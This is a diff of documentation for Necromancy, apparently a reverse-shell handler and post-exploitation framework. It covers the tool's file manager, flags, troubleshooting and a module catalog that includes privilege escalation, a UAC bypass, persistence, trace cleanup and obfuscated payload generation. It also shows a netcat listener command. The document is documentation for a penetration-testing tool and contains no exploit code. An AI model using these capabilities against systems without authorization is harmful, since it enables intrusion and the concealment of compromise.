-#### Build Issues
-```bash
-# Missing dependencies
-go mod download
-go mod tidy
-
-# Cross-compilation issues
-GOOS=linux GOARCH=amd64 go build -o necromancy-linux-amd64 .
-```
-
-#### Runtime Issues
-
-**Sessions not connecting:**
-- Check firewall settings
-- Verify port availability
-- Test with `nc -lvp 4444`
-
-**Banner not displaying:**
-- Check ascii.txt permissions
-- Verify terminal color support
-- Test with `echo $TERM`
-
-**File manager freezing:**
-- Use simplified commands (already implemented)
-- Check target system compatibility
-- Verify shell type support
-
-#### UI Issues
-
-**Terminal size problems:**
-- Implement SIGWINCH handling
-- Use `stty size` to check dimensions
-- Test with different terminal emulators
-
-**Color display issues:**
-- Check terminal color support
-- Use 256-color palette
-- Test with `tput colors`
-
-## 🔒 Security
-
-### Security Best Practices
-
-1. **Authorized Testing Only**
-   - Only use on systems you own or have permission to test
-   - Obtain proper written authorization
-   - Follow responsible disclosure guidelines
-
-2. **Network Isolation**
-   - Use isolated network segments when possible
-   - Implement proper network segmentation
-   - Monitor for unexpected connections
-
-3. **Session Security**
-   - Use encrypted connections when available
-   - Implement proper session isolation
-   - Regularly review access logs
-
-4. **Operational Security**
-   - Document all actions taken
-   - Maintain communication with stakeholders
-   - Plan for thorough cleanup
-
-### Security Features
-
-- **No Hardcoded Credentials**: All credentials must be explicitly configured
-- **Session Isolation**: Sessions are isolated from each other
-- **Input Validation**: Basic input validation for user commands
-- **Error Sanitization**: Errors are sanitized to prevent information leakage
-- **Secure Defaults**: Secure configuration options by default
-
-### Reporting Security Issues
-
-Please report security vulnerabilities privately to:
-- Email: security@necromancy-project.com
-- GitHub Security Advisories
-
-## 📚 Additional Resources
-
-### External Documentation
-- [Go Documentation](https://golang.org/doc/)
-- [tview Documentation](https://github.com/rivo/tview)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-
-### Community Resources
-- [GitHub Repository](https://github.com/Aryma-f4/necromancy)
-- [Issue Tracker](https://github.com/Aryma-f4/necromancy/issues)
-- [Discussions](https://github.com/Aryma-f4/necromancy/discussions)
+### File manager status
+
+The file manager exists and is wired into the session workflow, but it is not fully feature-complete.
+
+#### Implemented or substantially wired
+
+- directory listing through the enhanced session commands,
+- path navigation,
+- enter directory,
+- go to parent directory,
+- refresh,
+- execute selected executable files,
+- delete file or directory with confirmation,
+- help view,
+- exit back to session actions.
+
+#### Present in UI but still partial or placeholder-driven
+
+- direct download action,
+- upload action from within the file-manager page,
+- create new file,
+- create new directory,
+- copy and paste,
+- inline edit behavior.
+
+### File-manager keys
+
+| Key | Action |
+| --- | --- |
+| `Enter` | Enter directory |
+| `Backspace` | Go to parent directory |
+| `r` | Refresh listing |
+| `d` | Download selected file |
+| `u` | Upload file |
+| `x` | Delete selected file or directory |
+| `n` | Create new file |
+| `m` | Create new directory |
+| `e` | Execute selected executable |
+| `c` | Copy selected file |
+| `v` | Paste file |
+| `a` | Select all |
+| `h` | Show help |
+| `q` | Quit file manager |
+| `Esc` | Return to session actions |
+
+## Module System
+
+The module system is available both as a catalog page and as an execution path after selecting a session.
+
+### How module execution works
+
+1. Open `Sessions`.
+2. Select a session.
+3. Open `Run Module`.
+4. Pick a module.
+5. Pick a shell tab to dispatch the module from.
+
+Module output then appears through the selected session stream.
+
+### Built-in module catalog
+
+| Module Key | Purpose | Status |
+| --- | --- | --- |
+| `peass_auto` | Auto-select LinPEAS or WinPEAS by detected OS | implemented |
+| `linpeas` | Linux privilege-escalation enumeration | implemented |
+| `winpeas` | Windows privilege-escalation enumeration | implemented |
+| `lse` | Linux Smart Enumeration helper | implemented |
+| `potato` | Windows potato-family helper | placeholder/helper |
+| `traitor` | Linux escalation helper | implemented |
+| `uac` | Windows UAC bypass helper | implemented |
+| `chisel` | Chisel tunneling helper | placeholder/helper |
+| `ligolo` | Ligolo-ng tunneling helper | placeholder/helper |
+| `ngrok` | Ngrok helper | placeholder/helper |
+| `meterpreter` | Meterpreter upgrade helper | placeholder/helper |
+| `cleanup` | Cleanup traces and history | implemented |
+| `panix` | Linux persistence helper | implemented |
+| `linux_procmemdump` | Linux process-memory helper | implemented/helper |
+| `filemanager` | File-manager workflow helper | workflow helper |
+| `redsun` | Windows enumeration helper | helper/bootstrap |
+| `bluehammer` | Windows exploitation helper | helper/bootstrap |
+| `payload_obfuscator` | Obfuscated payload generation helper | implemented/helper |
+| `enhanced_preflight_recon` | Recon and security-surface checks | implemented/helper |
+| `process_monitor` | Background process monitoring helper | implemented/helper |
+| `background_checker` | Check running background processes | implemented/helper |
+
+For the full module page and shorter descriptions, see [MODULES.md](MODULES.md).
+
+## Logging And Runtime Files
+
+### Runtime files created by the app
+
+| Path | Purpose |
+| --- | --- |
+| `necromancy-go.log` | Main application log |
+| `logs/session_<id>.log` | Per-session output logs |
+
+### Logging behavior
+
+- Session logs are enabled by default.
+- `-L` disables per-session logs.
+- Main application logging still goes to `necromancy-go.log`.
+
+## Configuration Notes
+
+Necromancy currently relies mainly on command-line flags. The repository includes `CONFIGURATION.md` with examples, but the live code path is flag-centric.
+
+### Practical knobs
+
+- Listener ports: `-p`
+- Interface/IP binding: `-i`
+- HTTP serving directory: `-s`
+- HTTP server port: `-w`
+- URL prefix: `--prefix`
+- Single-session mode: `-S`
+- PTY auto-upgrade disable: `-U`
+- Headless mode: `--headless`
+
+### Notes on config examples in the repo
+
+Some older documentation examples mention environment-variable-driven behavior or extended configuration surfaces. Treat those as guidance documents, not guaranteed runtime features, unless you have verified the corresponding implementation in code.
+
+## Troubleshooting
+
+### No sessions appear
+
+- Confirm the listener started on the expected port.
+- Verify firewalls and network path between target and operator box.
+- Check whether another process already owns the port.
+- Use `./necromancy --interfaces` to confirm local network details.
+
+### Payload IP looks wrong
+
+- Refresh the payload page with `r`.
+- If the public IP is unavailable or private, Necromancy falls back to the detected local IP.
+- Bind explicitly with `-i` if you want a specific listener address.
+
+### TUI does not start
+
+- Use `--headless` in non-interactive shells.
+- Ensure `TERM` is not `dumb`.
+- Ensure stdin and stdout are real terminals when launching the TUI.
+
+### PTY upgrade does not work
+
+- PTY upgrade is skipped for Windows sessions.
+- Some minimal shells do not have the tooling or shell behavior needed for a successful upgrade.
+- Use raw interaction and verify the target has a compatible shell environment.
+
+### Update command fails
+
+- Confirm outbound access to GitHub Releases and the GitHub API.
+- Ensure the running binary can be replaced on disk.
+- On Unix-like systems, verify file permissions on the executable path.
+
+### File-manager action looks incomplete
+
+That may be expected. Several file-manager actions are surfaced in the UI before their full implementation is finished.
+
+## Security And Safe Use
+
+- Only use Necromancy in authorized environments.
+- Review every payload and helper action before using it.
+- Validate module behavior on lab targets first.
+- Treat placeholder or helper modules as starting points, not one-click guarantees.
+- Keep logs and staged files under proper operational control.
+
+### Reporting a security issue
+
+See [SECURITY.md](SECURITY.md) for disclosure instructions.
+
+## Related Documents
+
+- [README.md](README.md): project overview and quick start
+- [MODULES.md](MODULES.md): module catalog
+- [QUICK_REFERENCE.md](QUICK_REFERENCE.md): short commands and workflows
+- [CONFIGURATION.md](CONFIGURATION.md): configuration examples
+- [AGENTS.md](AGENTS.md): architecture notes for AI agents
+- [CONTRIBUTING.md](CONTRIBUTING.md): contribution guide
+- [SECURITY.md](SECURITY.md): security policy
 
 ---
 
-**Version**: 1.5.0  
-**Last Updated**: 2026-04-23  
-**Repository**: https://github.com/Aryma-f4/necromancy
+**Version:** `v1.5.1`
+**Last reviewed:** `2026-04-27`
+**Repository:** <https://github.com/Aryma-f4/necromancy>
